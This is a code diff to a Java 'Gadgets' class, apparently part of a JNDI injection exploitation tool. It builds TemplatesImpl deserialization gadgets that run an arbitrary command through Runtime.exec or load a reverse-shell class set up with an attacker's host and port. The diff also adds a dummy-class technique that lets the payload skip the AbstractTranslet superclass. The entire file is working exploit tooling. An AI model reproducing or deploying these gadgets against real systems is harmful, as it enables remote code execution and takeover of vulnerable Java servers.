@@ -4,7 +4,6 @@ import map.jndi.template.ReverseShell;
 import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.*;
 import javassist.bytecode.AccessFlag;
 import javassist.bytecode.ClassFile;
@@ -12,9 +11,7 @@ import javassist.bytecode.ClassFile;
 import java.io.ByteArrayInputStream;
 
 public class Gadgets {
-
-    public static TemplatesImpl createTemplatesImpl(String command) throws Exception {
-        TemplatesImpl templatesImpl = new TemplatesImpl();
+    public static TemplatesImpl create(String command) throws Exception {
         ClassPool pool = ClassPool.getDefault();
 
         String body = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", command);
@@ -24,53 +21,46 @@ public class Gadgets {
         classFile.setAccessFlags(AccessFlag.PUBLIC);
         CtClass clazz = pool.makeClass(classFile);
 
-        CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
-        clazz.setSuperclass(superClazz);
-
         CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
         constructor.setModifiers(Modifier.PUBLIC);
         constructor.setBody(body);
         clazz.addConstructor(constructor);
 
-        ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
-        ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
-        ReflectUtil.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
-
-        return templatesImpl;
+        return makeTemplatesImpl(clazz.toBytecode());
     }
 
-    public static TemplatesImpl createTemplatesImpl(String host, int port) throws Exception {
-        TemplatesImpl templatesImpl = new TemplatesImpl();
+    public static TemplatesImpl create(String host, int port) throws Exception {
         ClassPool pool = ClassPool.getDefault();
 
         CtClass clazz = pool.get(ReverseShell.class.getName());
-        CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
-        clazz.setSuperclass(superClazz);
-
         ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
         ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(port));
-
         clazz.replaceClassName(clazz.getName(), MiscUtil.getClassName());
 
+        return makeTemplatesImpl(clazz.toBytecode());
+    }
+
+    public static TemplatesImpl create(byte[] bytecode) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass(new ByteArrayInputStream(bytecode));
+
+        return makeTemplatesImpl(clazz.toBytecode());
+    }
+
+    public static TemplatesImpl makeTemplatesImpl(byte[] bytecode) throws Exception {
+        TemplatesImpl templatesImpl = new TemplatesImpl();
+
         ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
-        ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
-        ReflectUtil.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
+        ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytecode, makeDummyClass()});
+        ReflectUtil.setFieldValue(templatesImpl, "_transletIndex", 0);
 
         return templatesImpl;
     }
 
-    public static TemplatesImpl createTemplatesImpl(byte[] byteCode) throws Exception {
-        TemplatesImpl templatesImpl = new TemplatesImpl();
+    public static byte[] makeDummyClass() throws Exception {
         ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass(MiscUtil.getClassName());
 
-        CtClass clazz = pool.makeClass(new ByteArrayInputStream(byteCode));
-        CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
-        clazz.setSuperclass(superClazz);
-
-        ReflectUtil.setFieldValue(templatesImpl, "_name", "Hello");
-        ReflectUtil.setFieldValue(templatesImpl, "_bytecodes", new byte[][]{clazz.toBytecode()});
-        ReflectUtil.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
-
-        return templatesImpl;
+        return clazz.toBytecode();
     }
 }
